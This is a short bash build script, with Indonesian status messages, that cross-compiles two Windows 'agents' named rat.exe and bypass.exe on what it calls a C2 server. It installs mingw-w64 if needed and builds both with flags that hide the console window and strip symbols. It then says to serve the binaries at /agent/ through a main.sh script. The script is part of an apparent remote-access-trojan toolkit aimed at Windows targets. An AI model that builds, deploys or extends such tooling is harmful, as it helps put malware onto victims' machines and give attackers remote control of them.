#!/usr/bin/env bash
# Build rat.exe + bypass.exe (Windows agents) from .cpp.
# Run this on the Linux/Ubuntu C2 server, NOT on the Windows target.
set -e

if ! command -v x86_64-w64-mingw32-g++ > /dev/null 2>&1; then
    echo " [*] mingw-w64 belum terpasang, memasang via apt..."
    sudo apt-get update -qq
    sudo apt-get install -y g++-mingw-w64-x86-64
fi

FLAGS=(-std=c++11 -static -O2 -s -mwindows -pthread -lws2_32)

echo " [*] Mengompilasi rat.exe..."
x86_64-w64-mingw32-g++ "${FLAGS[@]}" rat.cpp -o rat.exe

echo " [*] Mengompilasi bypass.exe..."
x86_64-w64-mingw32-g++ "${FLAGS[@]}" bypass.cpp -o bypass.exe

echo " [+] Selesai: rat.exe + bypass.exe"
echo "     Letakkan keduanya di folder yang sama dengan main.sh,"
echo "     lalu jalankan 'bash main.sh' agar diserve di /agent/"
